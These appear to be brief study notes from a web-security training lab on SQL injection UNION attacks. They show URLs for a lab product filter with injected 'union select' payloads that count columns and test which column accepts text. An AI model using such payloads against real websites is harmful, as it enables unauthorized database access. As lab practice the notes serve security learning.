## SQL injection UNION attack, finding a column containing text
main url for proudct category:==>
https://0a85001804dcacad813ebb68001900b1.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories

find the column using union select queary==>
https://0a85001804dcacad813ebb68001900b1.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' union select null,null,null --  ;

find the column data type==>
https://0a85001804dcacad813ebb68001900b1.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' union select null,'abcdefgh',null --